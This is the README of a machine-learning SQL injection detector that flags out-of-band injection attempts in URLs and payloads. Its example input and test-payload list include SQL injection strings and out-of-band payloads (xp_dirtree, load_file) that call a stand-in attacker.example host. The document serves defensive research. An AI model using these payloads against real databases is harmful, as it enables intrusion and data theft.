# OOB SQL Injection Analyzer

A Python-based security tool that detects **SQL Injection payloads**, including **Out-of-Band (OOB) SQL Injection attempts**, using **Machine Learning and pattern-based detection**.

This project analyzes user-provided **URLs or SQL payloads** and determines whether they are **malicious or safe**. It combines **TF-IDF feature extraction**, **Logistic Regression classification**, and **OOB SQLi pattern detection** to identify suspicious inputs.

---

# Features

* Detects **SQL Injection payloads using Machine Learning**
* Identifies **Out-of-Band SQL Injection patterns**
* Accepts **URLs or raw SQL payloads**
* Uses **TF-IDF vectorization for text feature extraction**
* Provides **clear classification results**
* Modular and easy to extend for more attack types

---

# Project Structure

```
oob_sqli_detector/
│
├── dataset/
│   └── sqli_dataset.csv
│
├── model/
│   ├── sqli_model.pkl
│   └── vectorizer.pkl
│
├── src/
│   ├── train_model.py
│   ├── analyzer.py
│   ├── oob_detector.py
│
├── app.py
├── requirements.txt
└── README.md
```

---

# How It Works

The analyzer processes input in three steps:

1. **Input Processing**

   * Accepts a URL or SQL payload from the user
   * Extracts parameters if a URL is provided

2. **Machine Learning Classification**

   * Converts input text into numerical vectors using **TF-IDF**
   * Uses a **Logistic Regression model** to classify the payload

3. **OOB Pattern Detection**

   * Checks for suspicious SQL patterns commonly used in **Out-of-Band SQL Injection**

The final output reports:

* ML prediction (Safe or Malicious)
* OOB SQL Injection detection result

---

# Installation

Clone the repository:

```
git clone https://github.com/yourusername/oob-sqli-analyzer.git
cd oob-sqli-analyzer
```

Install dependencies:

```
pip install -r requirements.txt
```

---

# Train the Model

Run the training script:

```
python src/train_model.py
```

This will create:

```
model/sqli_model.pkl
model/vectorizer.pkl
```

---

# Run the Analyzer

Start the analyzer:

```
python app.py
```

Example input:

```
http://example.com/product?id=1' UNION SELECT load_file('\\\\attacker.example\\test')
```

Example output:

```
ML Detection: Malicious
OOB SQLi: Possible OOB SQL Injection Detected
```

---

# Example Payloads for Testing

Malicious payload examples:

```
1' OR '1'='1
admin'--
UNION SELECT password FROM users
1; EXEC xp_dirtree '\\attacker.example\test'
1' UNION SELECT load_file('\\\\attacker.example\\test')
```

Safe examples:

```
product=123
search=laptop
user=Ravi
page=2
```

---

# Technologies Used

* Python
* Scikit-learn
* Pandas
* TF-IDF Vectorization
* Logistic Regression
* Pattern-Based Security Analysis

---

# Limitations

* The tool detects **suspicious payloads**, but it does not confirm whether a system is actually vulnerable.
* Accuracy depends on the **quality and size of the dataset**.
* Advanced SQL injection techniques may require **larger datasets or deep learning models**.

---

# Future Improvements

* Detect additional SQL injection types:

  * Blind SQL Injection
  * Time-Based SQL Injection
  * Union-Based SQL Injection
* Add **Deep Learning models (LSTM / BERT)**
* Build a **web interface with Flask**
* Integrate with **security scanners or proxy tools**

---

# Educational Purpose

This project is intended for **educational and research purposes only** to help understand SQL Injection detection techniques and improve web application security.

---

# Author

**Karri Ravi Shankar**

Interested in **Machine Learning, AI Security, and Cybersecurity Research**.

---
